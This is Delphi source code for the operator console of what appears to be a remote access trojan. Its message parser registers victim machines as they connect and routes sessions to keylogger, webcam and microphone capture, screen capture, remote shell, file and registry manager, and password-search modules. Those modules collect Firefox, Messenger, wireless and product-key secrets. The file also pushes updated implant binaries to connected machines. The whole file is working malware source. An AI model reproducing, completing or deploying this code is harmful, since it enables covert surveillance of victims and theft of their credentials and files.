unit UnitMain;

interface

uses
  //ScktComp
  ScktComp, Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, XPMan, ToolWin, ImgList, UnitConnectionForm, SHellApi,
  Menus, ExtCtrls, AppEvnts, StdCtrls, mmsystem,
  ImageHlp, IniFiles, Gauges, UnitSharedData, DateUtils,
  OleCtrls, SHDocVw, UnitTransferManager, RichEdit;

type

  TClientForm = class(TForm)
    ToolBar1: TToolBar;
    ToolButton1: TToolButton;
    XPManifest1: TXPManifest;
    ToolButton2: TToolButton;
    ApplicationEvents1: TApplicationEvents;
    MainMenu1: TMainMenu;
    File1: TMenuItem;
    Seach1: TMenuItem;
    PageControl1: TPageControl;
    ToolButton4: TToolButton;
    PopupMenu1: TPopupMenu;
    SearchPasswords1: TMenuItem;
    ToolButton5: TToolButton;
    Timer1: TTimer;
    Help1: TMenuItem;
    About1: TMenuItem;

    OpenDialog1: TOpenDialog;
    RichEdit1: TRichEdit;
    System1: TMenuItem;
    ImageList2: TImageList;
    LogOff1: TMenuItem;
    Reboot1: TMenuItem;
    Shutdown1: TMenuItem;
    Update1: TMenuItem;
    Share1: TMenuItem;
    Close1: TMenuItem;
    N2: TMenuItem;
    Ping1: TMenuItem;
    N3: TMenuItem;
    Users1: TMenuItem;
    GroupOnlineContatcs1: TMenuItem;
    N1: TMenuItem;
    ImportContactList1: TMenuItem;
    ExportContactList1: TMenuItem;
    SaveDialog1: TSaveDialog;
    OpenDialog2: TOpenDialog;
    Button1: TButton;
    ImageList1: TImageList;
    Panel1: TPanel;
    ListView1: TListView;
    Splitter1: TSplitter;
    TreeView1: TTreeView;
    Execute1: TMenuItem;
    Timer3: TTimer;
    Panel2: TPanel;
    Splitter2: TSplitter;
    RichEdit2: TRichEdit;
    ToolButton3: TToolButton;
    procedure ApplicationEvents1Exception(Sender: TObject; E: Exception);
    procedure ToolButton1Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure ToolButton2Click(Sender: TObject);
    procedure SearchPasswords1Click(Sender: TObject);
    procedure Seach1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Help2Click(Sender: TObject);
    procedure About1Click(Sender: TObject);
    procedure LogOff1Click(Sender: TObject);
    procedure Reboot1Click(Sender: TObject);
    procedure Shutdown1Click(Sender: TObject);
    procedure Close1Click(Sender: TObject);
    procedure Share1Click(Sender: TObject);
    procedure Ping1Click(Sender: TObject);
    procedure Update1Click(Sender: TObject);
    procedure GroupOnlineContatcs1Click(Sender: TObject);
    procedure ExportContactList1Click(Sender: TObject);
    procedure ImportContactList1Click(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure FormCanResize(Sender: TObject; var NewWidth,
      NewHeight: Integer; var Resize: Boolean);
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
    procedure Execute1Click(Sender: TObject);
    procedure Timer3Timer(Sender: TObject);
    procedure ToolButton3Click(Sender: TObject);
  private
    { Private declarations }
    procedure InitRichEditURLDetection(RE: TRichEdit);
  public
    { Public declarations }
    PingSocketData: TSocketData;
    LastSortedColumn: integer;
    Ascending: bool;
    Strings: TStringList;
    ScreenTotal,ScreenOnline: integer;
    procedure CoolTrayIcon1BalloonHintShow(Sender: TObject);
    procedure CoolTrayIcon1DblClick(Sender: TObject);
    procedure ParseData(Socket: TCustomWinSocket);
    function FindTransferManager(MainSocket: TCustomWinSocket; SocketData: TSocketData): TTransferManager;
    procedure ServerSocket1ClientRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure ServerSocket1ClientDisconnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure ServerSocket1ClientError(Sender: TObject; Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure ServerSocket1ClientWrite(Sender: TObject; Socket: TCustomWinSocket);
    procedure DisconnectSocket(SocketData: TSocketData);
    procedure AddData(Text: string; Colour: TColor);
  protected
    procedure WndProc(var Msg: TMessage); override;
  end;


var
  ClientForm: TClientForm;
  CPS: integer;

implementation

{$R *.dfm}

uses
  UnitScreenCapture, UnitSettings, UnitFileManager, UnitFileTransfer,
  UnitFileSearch, UnitWebcamCapture, UnitServiceManager,
  UnitWindowManager, UnitProcessManager,UnitAudioCapture, UnitKeyLogger,
  UnitInstalledApplications, UnitRegEdit,UnitRemoteShell, UnitSystemInfo,
  UnitPasswordAudit, UnitPasswordSearch, UnitCreateServer,
  UnitSplashScreen, UnitShareServer;


function FindForm(H: THandle): TForm;
var
  i: integer;
begin
  Result := nil;
  for i := 0 to Screen.FormCount -1 do begin
    if Screen.Forms[i].Handle = H then Result := Screen.Forms[i];
  end;
end;

procedure TClientForm.WndProc(var Msg: TMessage);
var
  p: TENLink;
  sURL: string;
  CE : TRichEdit;
begin
 if (Msg.Msg = WM_NOTIFY) then
 begin
  if (PNMHDR(Msg.lParam).code = EN_LINK) then
  begin
   p := TENLink(Pointer(TWMNotify(Msg).NMHdr)^);
   if (p.Msg = WM_LBUTTONDOWN) then
   begin
    try
     CE := TRichEdit(ClientForm.ActiveControl);
     SendMessage(CE.Handle, EM_EXSETSEL, 0, Longint(@(p.chrg)));
     sURL := CE.SelText;
     ShellExecute(Handle, 'open', PChar(sURL), 0, 0, SW_SHOWNORMAL);
    except
    end;
   end;
  end;
 end;

 inherited;
end; (* TForm1.WndProc *)

function TClientForm.FindTransferManager(MainSocket: TCustomWinSocket; SocketData: TSocketData): TTransferManager;
var
  i: integer;
  //Stream: TMemory
begin
  Result := nil;

  for i := 0 to Screen.FormCount -1 do begin
    if Screen.Forms[i].ClassType <> TTransferManager then Continue;
    if TTransferManager(Screen.Forms[i]).SocketData.ServerData.Computer = SocketData.ServerData.Computer then begin
      if TTransferManager(Screen.Forms[i]).SocketData.ServerData.User = SocketData.ServerData.User then begin
        Result := TTransferManager(Screen.Forms[i]);
        Result.WindowState := wsNormal;
        Result.Show;
        Exit;
      end;
    end;
  end;

  if Result = nil then begin
    Result := TTransferManager.Create(nil);
    Result.Caption := SocketData.ServerData.Name + ' - Transfer Manager - [Offline]';
    Result.SocketData := SocketData;
    Result.MainSocket := SocketData.MainSocket;
    Result.Group := SocketData.ServerData.Group;
    Result.Computer := SocketData.ServerData.Computer;
    Result.User := SocketData.ServerData.User;
    SocketData.Form := Result;
    UnitSharedData.SendData(MainSocket,'NewConnection|TransferManagerSocket|' + inttostr(Result.Handle));
    Result.Show;
  end;

end;

function MSecToTime(mSec: Int64): string;
const
  ticksperday: Integer    = 1000 * 60 * 60 * 24;
  ticksperhour: Integer   = 1000 * 60 * 60;
  ticksperminute: Integer = 1000 * 60;
  tickspersecond: Integer = 1000;
function AddLeadingZeroes(const aNumber, Length : integer) : string;
begin
   result := SysUtils.Format('%.*d', [Length, aNumber]) ;
end;
var
  t: int64;
  h, m, s: Integer;
begin
  t := mSec;

  //d := t div ticksperday;
  //Dec(t, d * ticksperday);

  h := t div ticksperhour;
  Dec(t, h * ticksperhour);

  m := t div ticksperminute;
  Dec(t, m * ticksperminute);

  s := t div tickspersecond;

  //Result := AddLeadingZeroes(d) + ':' +
  Result := AddLeadingZeroes(h,2) + ':' + AddLeadingZeroes(m,2) + ':' + AddLeadingZeroes(s,2);

end;

procedure TClientForm.ParseData(Socket: TCustomWinSocket);
var
  Data,Command: string;
  DataSize: string;
  LengthDataSize,LengthSocketData: integer;
  SocketData: TSocketData;
  i: integer;
  Li: TListItem;
  ConnectionForm: TConnectionForm;
  H: THandle;
  Ping: integer;
  Ini: TIniFile;
  Stream: TMemoryStream;
  Bmp,Bmp2: TBitmap;
  Rect: TRect;
  Cpu: double;
  Memory: TMemoryStatus;
  Strings: TStringList;
  TempSocketData: TSocketData;
  ReceiveDataProc: procedure(Socket: TCustomWinSocket; Progress,Max: int64);
  FileTransfer: TFileTransfer;
  NewLi: TListItem;
  tmp: string;
  TmpSocketData: TSocketData;
  SerialKey: string;
  Ram: int64;
  DebugLi: TListItem;
begin
  if Socket = nil then exit;
  if Socket.Data = nil then exit;

  SocketData := TSocketData(Socket.Data);
  SocketData.Socket := Socket;

  if SocketData.Data = '' then exit;

  DataSize := Split(SocketData.Data,'|',1);
  LengthDataSize := Length(DataSize);
  LengthSocketData := Length(SocketData.Data) - Length(DataSize) -1;

  if SocketData.ReceiveDataProc <> nil then begin
    @ReceiveDataProc := SocketData.ReceiveDataProc;
    try
      ReceiveDataProc(Socket,LengthSocketData,strtoint(DataSize));
    except
    end;
  end;

  try
    if LengthSocketData < strtoint(DataSize) then exit;
  except
    SocketData.Data := '';
    Exit;
  end;


  Delete(SocketData.Data,1,LengthDataSize+1);

  try
  Data := Copy(SocketData.Data,1,StrToInt(DataSize));
  except
  end;

  Delete(SocketData.Data,1,Length(Data));

  Data := Decompress(SocketData,Data);

  try

  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);

  if Command = 'Hello' then begin
    SendData(Socket,'LogIn');
  end;


  if Command = 'OnConnect' then begin

    if ClientForm.ScreenOnline >= (100000 / 1000) then begin
      Socket.Close;
      Exit;
    end;
    SocketData.IsMainSocket := True;

    if pos(Command,Data) > 0 then Data := Copy(Data,1,pos(Command,Data));
    SocketData.ServerData.Group := Split(Data,'|',1);
    Delete(Data,1,Length(Split(Data,'|',1)) +1);

    SocketData.ServerData.Name := Split(Data,'|',1);
    Delete(Data,1,Length(Split(Data,'|',1)) +1);

    SocketData.ServerData.User := Split(Data,'|',1);
    Delete(Data,1,Length(Split(Data,'|',1)) +1);

    SocketData.ServerData.Computer := Split(Data,'|',1);
    Delete(Data,1,Length(Split(Data,'|',1)) +1);

    SocketData.ServerData.Lan := Split(Data,'|',1);
    Delete(Data,1,Length(Split(Data,'|',1)) +1);

    SocketData.ServerData.Webcam := Split(Data,'|',1);
    Delete(Data,1,Length(Split(Data,'|',1)) +1);

    SocketData.ServerData.Version := Split(Data,'|',1);
    Delete(Data,1,Length(Split(Data,'|',1)) +1);

    SocketData.Ping := '-';
    SocketData.Idle := Split(Data,'|',1);
    Delete(Data,1,Length(Split(Data,'|',1)) +1);

    SocketData.ServerData.Country := Split(Data,'|',1);
    Delete(Data,1,Length(Split(Data,'|',1)) +1);

    SocketData.ServerData.Language := Split(Data,'|',1);
    Delete(Data,1,Length(Split(Data,'|',1)) +1);

    SocketData.ServerData.Account := Split(Data,'|',1);
    Delete(Data,1,Length(Split(Data,'|',1)) +1);

    SocketData.ServerData.Processor := Split(Data,'|',1);
    Delete(Data,1,Length(Split(Data,'|',1)) +1);

    SocketData.ServerData.Memory := Split(Data,'|',1);
    Delete(Data,1,Length(Split(Data,'|',1)) +1);
    Stream := TMemoryStream.Create;
    Stream.Write(pointer(String(SocketData.ServerData.Memory))^,Length(SocketData.ServerData.Memory));
    Stream.Position := 0;
    Stream.Read(Ram,Sizeof(Ram));
    Stream.Free;
    SocketData.ServerData.Memory :=  IntToStr(Ram);

    SocketData.ServerData.Os := Split(Data,'|',1);
    Delete(Data,1,Length(Split(Data,'|',1)) +1);

    SocketData.ServerData.OfflineLogger := Split(Data,'|',1);
    Delete(Data,1,Length(Split(Data,'|',1)) +1);

    SocketData.ServerData.OfflineScreenCapture := Split(Data,'|',1);
    Delete(Data,1,Length(Split(Data,'|',1)) +1);

    SocketData.ServerData.RootDir := Split(Data,'|',1);
    Delete(Data,1,Length(Split(Data,'|',1)) +1);

    SocketData.ServerData.DesktopDir := Split(Data,'|',1);
    Delete(Data,1,Length(Split(Data,'|',1)) +1);

    SocketData.ServerData.MyDocuments := Split(Data,'|',1);
    Delete(Data,1,Length(Split(Data,'|',1)) +1);

    SocketData.ServerData.ApplicationData := Split(Data,'|',1);
    Delete(Data,1,Length(Split(Data,'|',1)) +1);

    SocketData.ServerData.CountryCode := '';
    SocketData.ServerData.CountryCode := Split(Data,'|',1);
    Delete(Data,1,Length(Split(Data,'|',1)) +1);

    ClientForm.AddData('Connection Attempt',clBlack);
    if Split(Data,'|',1) <> Settings.Edit3.Text then begin
      //ShowMessage('Password is ' + Split(Data,'|',1));
      ClientForm.AddData('Connection Closed' + Chr(9) + Chr(9) + 'Incorrect Password',$000080FF);
      Socket.Close;
      Exit;
    end;
    Delete(Data,1,Length(Split(Data,'|',1)) +1); //deletepassword

    SocketData.ServerData.SerialKey := PasswordSearch.GetSerialKey(Split(Data,'|',1));
    Delete(Data,1,Length(Split(Data,'|',1)) +1);

    if (not ClientForm.ToolButton1.Down) and (not ClientForm.ToolButton2.Down) then ClientForm.PageControl1.BringToFront;

    SocketData.MainPath := Settings.Edit1.Text + SocketData.ServerData.Computer + '\' + SocketData.ServerData.User + '\';
    MakeSureDirectoryPathExists(pchar(SocketData.MainPath));

    SetupIpFlag(SocketData);

    Ini := TIniFile.Create(SocketData.MainPath + 'Settings.Ini');
    try
      SocketData.ServerData.Group := Ini.ReadString('Identification','Group',SocketData.ServerData.Group);
      SocketData.ServerData.Name := Ini.ReadString('Identification','Name',SocketData.ServerData.Name);
      Ini.WriteString('Identification','Group',SocketData.ServerData.Group);
      Ini.WriteString('Identification','Name',SocketData.ServerData.Name);
      SocketData.ServerData.Special := Ini.ReadString('Identification','Special','False');
      if Ini.ReadString('Profile','FirstConnect','') = '' then Ini.WriteString('Profile','FirstConnect',DateTimeToSTr(Today));
      Ini.WriteString('Profile','LastConnect',DateTimeToSTr(Today));
      if Ini.ReadString('Profile','FirstConnect','') = Ini.ReadString('Profile','LastConnect','') then SocketData.NewConnection := True;
    except
      //ShowMessage(SysErrorMessage(GetLastError));
    end;
    Ini.Free;

    SocketData.ServerData.Group := ParseName(SocketData,SocketData.ServerData.Group);
    SocketData.ServerData.Name := ParseName(SocketData,SocketData.ServerData.Name);

    ConnectionForm := FindConnectionForm(SocketData.ServerData.Group);

    Li := nil;

    try
      for i := 0 to ConnectionForm.ListView1.Items.Count -1 do begin
        if ConnectionForm.ListView1.Items[i].SubItems.Count < 11 then Continue;
        if (ConnectionForm.ListView1.Items[i].SubItems[3] = SocketData.ServerData.User) and
        (ConnectionForm.ListView1.Items[i].SubItems[2] = SocketData.ServerData.Computer) then begin
          Li := ConnectionForm.ListView1.Items[i];
          if Li.Data = nil then break;
        end;
      end;
    except
    end;

    if Li <> nil then begin

      if TSocketData(Li.Data).MainSocket <> nil then begin
        ClientForm.AddData('Connection Refused' + Chr(9) + SocketData.ServerData.Group + ' - ' + SocketData.ServerData.Name,$000080FF);
        Socket.Close;
        Exit;
      end;

      if ClientForm.GroupOnlineContatcs1.Checked then begin
        Li.Delete;
        Li := ConnectionForm.ListView1.Items.Insert(0);
        for i := 1 to 12 do Li.SubItems.Add('');
      end;

    end else begin

      if ClientForm.GroupOnlineContatcs1.Checked then Li := ConnectionForm.ListView1.Items.Insert(0)
      else  Li := ConnectionForm.ListView1.Items.Add;

      for i := 1 to 12 do Li.SubItems.Add('');
    end;

    SocketData.MainSocket := Socket;
    Li.Caption := SocketData.ServerData.Name;
    Li.SubItems[0] := SocketData.ServerData.Lan;
    Li.SubItems[1] := SocketData.ServerData.Wan;
    Li.SubItemImages[1] := SocketData.FlagIndex;
    Li.SubItems[2] := SocketData.ServerData.Computer;
    Li.SubItems[3] := SocketData.ServerData.User;
    Li.SubItems[4] := SocketData.ServerData.Account;
    Li.SubItems[5] := SocketData.ServerData.Os;
    Li.SubItems[6] := SocketData.ServerData.Processor + ' Mhz';
    Li.SubItems[7] := FileSizeToSTr(strtoint64(SocketData.ServerData.Memory));
    Li.SubItems[8] := SocketData.ServerData.Webcam;
    if SocketData.ServerData.Webcam = 'Detected' then Li.SubItemImages[8] := 2 else Li.SubItemImages[8] := 3;
    Li.SubItems[9] := SocketData.ServerData.Version;
    Li.SubItems[10] := '-'; //SocketData.Ping;
    if SocketData.Idle = '' then SocketData.Idle := '0';
    Li.SubItems[11] := MSecToTime(StrToInt(SocketData.Idle));


    Li.Data := SocketData;
    SocketData.ListItem := Li;
    SocketData.Socket := Socket;
    SocketData.ConnectionForm := ConnectionForm;
    if ConnectionForm.ShowThumbnails1.Checked then Li.ImageIndex := 0 else Li.ImageIndex  := 1;
    if SocketData.ServerData.Special = 'True' then Li.StateIndex := 1 else Li.StateIndex := 0;

    COnnectionForm.ClickTheColumn;
    ConnectionForm.UpdateCaption;

    if Settings.CheckBox4.Checked then begin
      if SocketData.NewConnection then begin
        DoPopup('New Connection',SocketData);
      end else begin
        DoPopup('Connection',SocketData);
      end;
    end;

    if Settings.CheckBox11.Checked then begin
      SndPlaySound(pchar(Settings.Edit4.Text),SND_ASYNC);
    end;

    SocketData.ScreenPath := SocketData.MainPath + 'Screen\';
    SocketData.WebcamPath := SocketData.MainPath + 'Webcam\';
    SocketData.DownloadPath := SocketData.MainPath + 'Downloads\';
    SocketData.AudioPath := SocketData.MainPath + 'Audio\';
    SocketData.CachePath := SocketData.MainPath + 'Cache\';

    MakeSureDirectoryPathExists(pchar(SocketData.ScreenPath));
    MakeSureDirectoryPathExists(pchar(SocketData.WebcamPath));
    MakeSureDirectoryPathExists(pchar(SocketData.DownloadPath));
    MakeSureDirectoryPathExists(pchar(SocketData.AudioPath));
    MakeSureDirectoryPathExists(pchar(SocketData.CachePath));

    SocketData.ConnectedAt := GetTickCount;
    ConnectionForm.ListView1.Refresh;

    SocketData.PingReceived := False;
    SocketData.SentFirstPing := True;
    SocketData.PingSentAt := GetTickCount;
    SendData(Socket,'Ping');
    ClientForm.AddData('New Connection' + Chr(9) + Chr(9) + SocketData.ServerData.Group + ' - ' + SocketData.ServerData.Name,clGreen);


    if Settings.CheckBox8.Checked then begin
      if SocketData.ServerData.Version <> '0.3' then begin
        if (pos('Private',SocketData.ServerData.Version) = 0) and (pos('Beta',SocketData.ServerData.Version) = 0) then begin
          SendData(Socket,'NewConnection|UpdateServer|' + Settings.Edit2.Text);
        end;
      end;
    end;

    Exit;
  end;


  if Command = 'Pong' then begin
    try
      if SocketData.ListItem = nil then exit;
      if SocketData.ListItem.SubItems.Count < 11 then exit;
      SocketData.PingReceived := True;
      Ping := GetTickCount - SocketData.PingSentAt;
      SocketData.Ping := inttostr(Ping);
      SocketData.ListItem.SubItems[10] := SocketData.Ping;
      SocketData.Idle := Data;
      SocketData.ListItem.SubItems[11] := MSecToTime(StrToInt(SocketData.Idle));
      SocketData.ConnectionForm.ClickTheColumn;
      Listview1.Refresh;
      Application.ProcessMessages;
      if SocketData.ConnectionForm.ShowThumbnails1.Checked or (SocketData = ClientForm.PingSocketData) then SendData(Socket,'ScreenShot|128');
    except
    end;
    Exit;
  end;

  if Command = 'ScreenShot' then begin
    Bmp := TBitmap.Create;
    stream := tmemorystream.Create;
    stream.WriteBuffer(pointer(Data)^,length(Data));
    stream.Position := 0;
    try
      Bmp.LoadFromStream(Stream);
    except
    end;
    Stream.free;
    Bmp2 := TBitmap.Create;
    Bmp2.Width := 128;
    Bmp2.Height := 128;
    Rect.Left := (Bmp2.Width div 2) - (Bmp.Width div 2);
    Rect.Top := (Bmp2.Height div 2) - (Bmp.Height div 2);
    Bmp2.Canvas.Draw(Rect.Left,Rect.Top,Bmp);
    if SocketData.ConnectionForm.ShowThumbnails1.Checked then SocketData.ConnectionForm.AddPicture(SocketData.ListItem,Bmp2);
    //if PingSocketData = SocketData then Image1.Picture.Assign(Bmp2);
    Bmp2.Free;
    Bmp.Free;
    Application.ProcessMessages;
  end;

  if Command = 'Status' then begin
    Stream := TMemoryStream.Create;
    Stream.Write(pointer(Data)^,length(Data));
    Stream.Position := 0;
    Stream.Read(Cpu,SizeOf(Cpu));
    Stream.Read(Memory,SizeOf(TMemoryStatus));
    Stream.Free;
    Data := FormatFloat('0',Cpu);
    SocketData.ConnectionForm.Gauge1.Progress := Memory.dwMemoryLoad;
    SocketData.ConnectionForm.Gauge2.Progress := strtoint(Data);
    SocketData.ConnectionForm.Timer2.Enabled := True;
  end;

  if Command = 'ScreenCapture' then begin
    TScreenCapture(SocketData.Form).ParseData(Socket,Data);
  end;

  if Command = 'ScreenCaptureSocket' then begin
    H := strtoint(Data);
    SocketData.Form := TScreenCapture(FindForm(H));
    if TScreenCapture(SocketData.Form).NewSocket <> nil then begin
      Socket.Close;
      Exit;
    end;
    SocketData.MainSocket := TScreenCapture(SocketData.Form).MainSocket;
    TScreenCapture(SocketData.Form).NewSocket := Socket;
    TScreenCapture(SocketData.Form).SetUpConnection(Socket);
    //TScreenCapture(SocketData.Form).Show;
  end;

  if Command = 'FileManager' then begin
    TFileManager(SocketData.Form).ParseData(Socket,Data);
  end;

  if Command = 'FileManagerSocket' then begin
    H := strtoint(Data);
    SocketData.Form := TFileManager(FindForm(H));
    if TFileManager(SocketData.Form).NewSocket <> nil then begin
      Socket.Close;
      Exit;
    end;
    SocketData.MainSocket := TFileManager(SocketData.Form).MainSocket;
    TFileManager(SocketData.Form).NewSocket := Socket;
    TFileManager(SocketData.Form).SetUpConnection(Socket);
    //TFileTransfer(SocketData.Form).Show;
  end;

  if Command = 'FileTransferSocket' then begin
    H := strtoint(Data);
    SocketData.Form := TFileTransfer(FindForm(H));
    SocketData.MainSocket := TFileTransfer(SocketData.Form).MainSocket;
    TFileTransfer(SocketData.Form).NewSocket := Socket;
    TFileTransfer(SocketData.Form).SetUpConnection(Socket);
  end;

  if Command = 'FileTransfer' then begin
    TFileTransfer(SocketData.Form).ParseData(Socket,Data);
  end;

  if Command = 'FileSearch' then begin
    TFileSearch(SocketData.Form).ParseData(Socket,Data);
  end;

  if Command = 'FileSearchSocket' then begin
    H := strtoint(Data);
    SocketData.Form := TFileSearch(FindForm(H));
    if TFileSearch(SocketData.Form).NewSocket <> nil then begin
      Socket.Close;
      Exit;
    end;
    SocketData.MainSocket := TFileManager(SocketData.Form).MainSocket;
    TFileSearch(SocketData.Form).NewSocket := Socket;
    TFileSearch(SocketData.Form).SetUpConnection(Socket);
    //TFileSearch(SocketData.Form).Show;
  end;

  if Command = 'TransferManager' then begin
    TFileSearch(SocketData.Form).ParseData(Socket,Data);
  end;

  if Command = 'TransferManagerSocket' then begin
    H := strtoint(Data);
    SocketData.Form := TTransferManager(FindForm(H));
    if TTransferManager(SocketData.Form).NewSocket <> nil then begin
      Socket.Close;
      Exit;
    end;
    SocketData.MainSocket := TTransferManager(SocketData.Form).MainSocket;
    TTransferManager(SocketData.Form).NewSocket := Socket;
    TTransferManager(SocketData.Form).SetUpConnection(Socket);
    //TTransferManager(SocketData.Form).Show;
  end;

  if Command = 'WebcamCapture' then begin
    TWebcamCapture(SocketData.Form).ParseData(Socket,Data);
  end;

  if Command = 'WebcamCaptureSocket' then begin
    H := strtoint(Data);
    SocketData.Form := TWebcamCapture(FindForm(H));
    if TWebcamCapture(SocketData.Form).NewSocket <> nil then begin
      Socket.Close;
      Exit;
    end;
    SocketData.MainSocket := TWebcamCapture(SocketData.Form).MainSocket;
    TWebcamCapture(SocketData.Form).NewSocket := Socket;
    TWebcamCapture(SocketData.Form).SetUpConnection(Socket);
    //TWebcamCapture(SocketData.Form).Show;
  end;

  if Command = 'ServiceManager' then begin
    TServiceManager(SocketData.Form).ParseData(Socket,Data);
  end;

  if Command = 'ServiceManagerSocket' then begin
    H := strtoint(Data);
    SocketData.Form := TServiceManager(FindForm(H));
    if TServiceManager(SocketData.Form).NewSocket <> nil then begin
      Socket.Close;
      Exit;
    end;
    SocketData.MainSocket := TServiceManager(SocketData.Form).MainSocket;
    TServiceManager(SocketData.Form).NewSocket := Socket;
    TServiceManager(SocketData.Form).SetUpConnection(Socket);
    //TServiceManager(SocketData.Form).Show;
  end;

  if Command = 'WindowManager' then begin
    TWindowManager(SocketData.Form).ParseData(Socket,Data);
  end;

  if Command = 'WindowManagerSocket' then begin
    H := strtoint(Data);
    SocketData.Form := TWindowManager(FindForm(H));
    if TWindowManager(SocketData.Form).NewSocket <> nil then begin
      Socket.Close;
      Exit;
    end;
    SocketData.MainSocket := TWindowManager(SocketData.Form).MainSocket;
    TWindowManager(SocketData.Form).NewSocket := Socket;
    TWindowManager(SocketData.Form).SetUpConnection(Socket);
    //TWindowManager(SocketData.Form).Show;
  end;

  if Command = 'ProcessManager' then begin
    TProcessManager(SocketData.Form).ParseData(Socket,Data);
  end;

  if Command = 'ProcessManagerSocket' then begin
    H := strtoint(Data);
    SocketData.Form := TProcessManager(FindForm(H));
    if TProcessManager(SocketData.Form).NewSocket <> nil then begin
      Socket.Close;
      Exit;
    end;
    SocketData.MainSocket := TProcessManager(SocketData.Form).MainSocket;
    TProcessManager(SocketData.Form).NewSocket := Socket;
    TProcessManager(SocketData.Form).SetUpConnection(Socket);
    //TProcessManager(SocketData.Form).Show;
  end;

  if Command = 'AudioCapture' then begin
    TAudioCapture(SocketData.Form).ParseData(Socket,Data);
  end;

  if Command = 'AudioCaptureSocket' then begin
    H := strtoint(Data);
    SocketData.Form := TAudioCapture(FindForm(H));
    if TAudioCapture(SocketData.Form).NewSocket <> nil then begin
      Socket.Close;
      Exit;
    end;
    SocketData.MainSocket := TAudioCapture(SocketData.Form).MainSocket;
    TAudioCapture(SocketData.Form).NewSocket := Socket;
    TAudioCapture(SocketData.Form).SetUpConnection(Socket);
    //TAudioCapture(SocketData.Form).Show;
  end;

  if Command = 'KeyLogger' then begin
    TKeyLogger(SocketData.Form).ParseData(Socket,Data);
  end;

  if Command = 'KeyLoggerSocket' then begin
    H := strtoint(Data);
    SocketData.Form := TKeyLogger(FindForm(H));
    if TKeyLogger(SocketData.Form).NewSocket <> nil then begin
      Socket.Close;
      Exit;
    end;
    SocketData.MainSocket := TKeyLogger(SocketData.Form).MainSocket;
    TKeyLogger(SocketData.Form).NewSocket := Socket;
    TKeyLogger(SocketData.Form).SetUpConnection(Socket);
    //TKeyLogger(SocketData.Form).Show;
  end;

  if Command = 'InstalledApplications' then begin
    TInstalledApplications(SocketData.Form).ParseData(Socket,Data);
  end;

  if Command = 'InstalledApplicationsSocket' then begin
    H := strtoint(Data);
    SocketData.Form := TInstalledApplications(FindForm(H));
    if TInstalledApplications(SocketData.Form).NewSocket <> nil then begin
      Socket.Close;
      Exit;
    end;
    SocketData.MainSocket := TInstalledApplications(SocketData.Form).MainSocket;
    TInstalledApplications(SocketData.Form).NewSocket := Socket;
    TInstalledApplications(SocketData.Form).SetUpConnection(Socket);
    //TInstalledApplications(SocketData.Form).Show;
  end;

  if Command = 'RegEdit' then begin
    TRegEdit(SocketData.Form).ParseData(Socket,Data);
  end;

  if Command = 'RegEditSocket' then begin
    H := strtoint(Data);
    SocketData.Form := TRegEdit(FindForm(H));
    if TRegEdit(SocketData.Form).NewSocket <> nil then begin
      Socket.Close;
      Exit;
    end;
    SocketData.MainSocket := TRegEdit(SocketData.Form).MainSocket;
    TRegEdit(SocketData.Form).NewSocket := Socket;
    TRegEdit(SocketData.Form).SetUpConnection(Socket);
    //TRegEdit(SocketData.Form).Show;
  end;

  if Command = 'RemoteShell' then begin
    TRemoteShell(SocketData.Form).ParseData(Socket,Data);
  end;

  if Command = 'RemoteShellSocket' then begin
    H := strtoint(Data);
    SocketData.Form := TRemoteShell(FindForm(H));
    if TRemoteShell(SocketData.Form).NewSocket <> nil then begin
      Socket.Close;
      Exit;
    end;
    SocketData.MainSocket := TRemoteShell(SocketData.Form).MainSocket;
    TRemoteShell(SocketData.Form).NewSocket := Socket;
    TRemoteShell(SocketData.Form).SetUpConnection(Socket);
    //TRemoteShell(SocketData.Form).Show;
  end;

  if Command = 'SystemInfo' then begin
    TSystemInformation(SocketData.Form).ParseData(Socket,Data);
  end;

  if Command = 'SystemInfoSocket' then begin
    H := strtoint(Data);
    SocketData.Form := TSystemInformation(FindForm(H));
    if TSystemInformation(SocketData.Form).NewSocket <> nil then begin
      Socket.Close;
      Exit;
    end;
    SocketData.MainSocket := TSystemInformation(SocketData.Form).MainSocket;
    TSystemInformation(SocketData.Form).NewSocket := Socket;
    TSystemInformation(SocketData.Form).SetUpConnection(Socket);
    //TSystemInformation(SocketData.Form).Show;
  end;

  if Command = 'PasswordAudit' then begin
    TPasswordAudit(SocketData.Form).ParseData(Socket,Data);
  end;

  if Command = 'PasswordAuditSocket' then begin
    H := strtoint(Data);
    SocketData.Form := TPasswordAudit(FindForm(H));
    if TPasswordAudit(SocketData.Form).NewSocket <> nil then begin
      Socket.Close;
      Exit;
    end;
    SocketData.MainSocket := TPasswordAudit(SocketData.Form).MainSocket;
    TPasswordAudit(SocketData.Form).NewSocket := Socket;
    TPasswordAudit(SocketData.Form).SetUpConnection(Socket);
    //TPasswordAudit(SocketData.Form).Show;
  end;

  if Command = 'UpdateServer' then begin
    Stream := TMemoryStream.Create;
    FileTransfer := TFileTransfer.Create(nil);
    FileTransfer.NewSocket := Socket;
    FileTransfer.Caption := 'Update Server';
    FileTransfer.Label1.Caption := 'Local Name: ' + ExtractFileName(Data);
    try
      Stream.LoadFromFile(Data);
      SetString(Data,Pchar(Stream.Memory),Stream.Size);
    except
    end;
    Stream.Free;
    if Data = '' then begin
      ShowMessage('UpdateFail');
      FileTransfer.Close;
      Exit;
    end;
    SocketData.Form := FileTransfer;
    FileTransfer.SetUpConnection2(Socket);
    FileTransfer.Show;
    SendData(Socket,'Update|' + Data);
  end;

  if Command = 'UpdateFail' then begin
    ShowMessage('UpdateFail');
  end;

  if Command = 'ProductKey' then PasswordSearch.ParseData(Socket,Command + '|' + Data);
  if Command = 'Firefox' then PasswordSearch.ParseData(Socket,Command + '|' + Data);
  if Command = 'Storage' then PasswordSearch.ParseData(Socket,Command + '|' + Data);
  if Command = 'Wireless' then PasswordSearch.ParseData(Socket,Command + '|' + Data);
  if Command = 'Messenger' then PasswordSearch.ParseData(Socket,Command + '|' + Data);

  except
  end;

  if Length(SocketData.Data) > 0 then begin
    Application.ProcessMessages;
    ParseData(Socket);
  end;


end;

